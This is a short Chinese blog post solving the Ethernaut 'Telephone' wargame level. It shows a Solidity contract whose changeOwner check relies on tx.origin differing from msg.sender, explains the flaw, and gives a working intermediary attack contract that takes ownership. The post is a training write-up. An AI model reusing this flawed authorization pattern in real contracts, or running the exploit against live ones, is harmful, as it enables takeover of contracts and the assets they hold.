---
layout: post
title: Telephone
tags: [ethernaut]
---

# Telephone
tx.origin和msg.sender的不同
```solidity
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### 代码分析
1. 当调用changeOwner(address)方法时，tx.origin与msg.sender不一致时即可获取到owner权限
2. tx.origin代表发出交易的原始方（交易的最初发起方）
3. msg.sender可以理解为发出当前call的发送方，当使用合约的call时，msg.sender会被替换为合约地址。

### 攻击合约
[官方答案](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/attacks/TelephoneAttack.sol)
```solidity
pragma solidity ^0.4.18;

contract TelephoneAttack {

  function attack(address _victim, address _owner) public {
    _victim.call(bytes4(keccak256("changeOwner(address)")), _owner);
  }
}
```
_victim为游戏合约instance的地址  
_owner为需要获取owner权限的地址

### 攻击方法
1. 部署攻击合约
2. 调用攻击合约方法attack(address, address)